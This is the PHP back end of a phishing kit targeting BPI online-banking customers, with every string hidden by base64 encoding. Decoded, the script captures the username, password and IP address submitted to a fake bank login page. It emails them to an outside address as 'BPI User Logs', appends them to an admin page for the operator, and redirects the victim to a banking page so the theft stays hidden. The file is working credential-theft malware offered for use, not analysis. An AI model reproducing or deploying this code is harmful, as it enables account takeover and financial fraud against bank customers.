<?php date_default_timezone_set(base64_decode('QXNpYS9NYW5pbGE='));
$time = date(base64_decode('aDppOnMgQQ=='));
$ip = getenv(base64_decode('UkVNT1RFX0FERFI='));
$message .= base64_decode('fC0tLS0tLS0tLS0tLVsgQlBJIExvZ1ogXS0tLS0tLS0tLS0tLQo=');
$message .= base64_decode('fC0tLS0tLS0tLS0tLVsgwqwgwqwgQmFuayBMb2dpbiBdLS0tLS0tLS0tLS0tCg==');
$message .= base64_decode('fCBVc2VySUQgTmFtZTog').$_POST[base64_decode('dXNlcm5hbWU=')].base64_decode('Cg==');
$message .= base64_decode('fCBPbmxpbmUgUGFzc3dvcmQ6IA==').$_POST[base64_decode('cGFzc3dvcmQ=')].base64_decode('Cg==');
$message .= base64_decode('fCBJUDog').$ip.base64_decode('Cg==');
$message .= base64_decode('fC0tLS0tLS0tLS0tLS0tLVsgKyBdIEdyZWV0aW5ncyBmcm9tIERhcmtOZXQgUGhpbGlwcGluZXMgWyArIF0tLS0tLS0tLS0tLS0tLS0K');
$bank = base64_decode('account@yahoo.com');
$subject = " [ + ] ~~ BPI User Logs ~~ [ + ] from $ip ";
$headers = base64_decode('RnJvbSA6IFplcmlvbg==');
$headers .= $_POST[base64_decode('ZU1haWxBZGQ=')].base64_decode('Cg==');
$headers .= base64_decode('TUlNRS1WZXJzaW9uOiAxLjAK');
$pane .= base64_decode('LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTxicj48YiBzdHlsZT0iY29sb3I6bGltZTsiPklQIDog').$ip.base64_decode('PC9iPjxicj48YiBzdHlsZT0iY29sb3I6eWVsbG93OyI+VXNlcm5hbWUgOiA=').$_POST[base64_decode('dXNlcm5hbWU=')].base64_decode('PC9iPjxicj48YiBzdHlsZT0iY29sb3I6eWVsbG93OyI+IE9ubGluZSBQYXNzd29yZCA6IA==').$_POST[base64_decode('cGFzc3dvcmQ=')].base64_decode('PC9iPjxicj4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tPGJyPg==');
$fh = fopen(base64_decode('Y29uZmlnL2FkbWluLnBocA==') ,base64_decode('YQ=='));
fwrite($fh, base64_decode('IA==').''.$pane .base64_decode('Cgo='));
fclose($fh);
if (mail($bank,$subject,$message,$headers))
	   {
		   header(base64_decode('TG9jYXRpb246IG1vYmlsZWJhbmtpbmcucGhw'));

	   }
else
    	   {
 		echo base64_decode('RVJST1IhIFBsZWFzZSBnbyBiYWNrIGFuZCB0cnkgYWdhaW4u');
  	   }
?>